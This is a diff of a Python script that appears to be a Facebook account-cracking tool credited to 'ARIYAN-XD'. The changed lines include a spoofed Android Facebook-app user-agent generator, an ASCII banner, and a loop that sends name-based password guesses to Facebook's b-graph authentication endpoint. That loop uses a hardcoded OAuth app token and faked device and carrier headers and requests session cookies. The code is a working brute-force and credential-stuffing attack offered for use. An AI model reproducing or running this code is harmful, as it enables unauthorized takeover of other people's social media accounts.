@@ -90,7 +90,7 @@ def UAX():
     ua = f"Dalvik/2.1.0 (Linux; U; Android {anv}; MX6 Build/QKQ1.328295.123) [FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};FBLC/{fblc};FBRV/{fbrv};FBCR/{fbcr};FBMF/{fbbd};FBBD/{fbbd};FBPN/{fbpn};FBDV/{fbdv};FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
     return ua
 
-logo= f'''
+logo=('''
 \033[38;5;91m          8b    d8    db    8888b.  Yb  dP     
 \033[38;5;90m          88b  d88   dPYb    8I  Yb  YbdP      
 \033[38;5;89m          88YbdP88  dP__Yb   8I  dY  dPYb      
@@ -99,8 +99,7 @@ logo= f'''
 \033[38;5;243m [\033[1;31m+\033[38;5;243m] \033[1;32mAUTHOR    \033[1;31m• \033[38;5;252mARIYAN-XD
 \033[38;5;241m [\033[1;31m+\033[38;5;241m] \033[1;32mVERSION   \033[1;31m•\033[38;5;50m 0.1
 \033[38;5;240m [\033[1;31m+\033[38;5;240m] \033[1;32mSTATUS    \033[1;31m• \033[38;5;249mError \033[1;31m>_<
-\033[38;5;236m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \033[1;37m
-'''
+\033[38;5;236m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \033[1;37m''')
 
 ####@-----Menu-----@####
 def Hxw_Main():
@@ -263,7 +262,7 @@ def method():
         sys.stdout.flush()
         for pword in totalpass:              
             #heads= ua,
-            header = {"Accept-Encoding": "identity","Content-Length": "750","host": "b-graph.facebook.com","Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32","x-fb-connection-bandwidth": "23441497","x-fb-net-hni": "32850","x-fb-sim-hni": "31472","Zero-Rated": "0","x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "MOBILE.LTE","user-agent": UAD(),"content-type": "app_authlication/x-www-form-urlencoded","x-fb-http-engine": "Liger","x-fb-client-IP": "True","x-fb-server-cluster": "Keep-Alive","Content-Type": "application/json"}
+            header = {"Accept-Encoding": "identity","Content-Length": "750","host": "b-graph.facebook.com","Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32","x-fb-connection-bandwidth": "23441497","x-fb-net-hni": "32850","x-fb-sim-hni": "31472","Zero-Rated": "0","x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "MOBILE.LTE","user-agent": UAX(),"content-type": "app_authlication/x-www-form-urlencoded","x-fb-http-engine": "Liger","x-fb-client-IP": "True","x-fb-server-cluster": "Keep-Alive","Content-Type": "application/json"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
             data={"adid": str(uuid.uuid4()), "method": "POST","format": "json","device_id": str(uuid.uuid4()), "family_device_id": str(uuid.uuid4()), "secure_family_device_id": str(uuid.uuid4()), "email": acc, "password": pword, "cpl": "true","credentials_type": "password","generate_session_cookies": "1","error_detail_type": "button_with_disabled","generate_machine_id": "1","os_ver": "5.1","carrier": "Banglalink","locale": "en_US","client_country_code": "US","omit_response_on_success": "false","enroll_misauth": "false","advertising_id": str(uuid.uuid4()), "encrypted_msisdn": "","fb_api_req_friendly_name": "authenticate"}
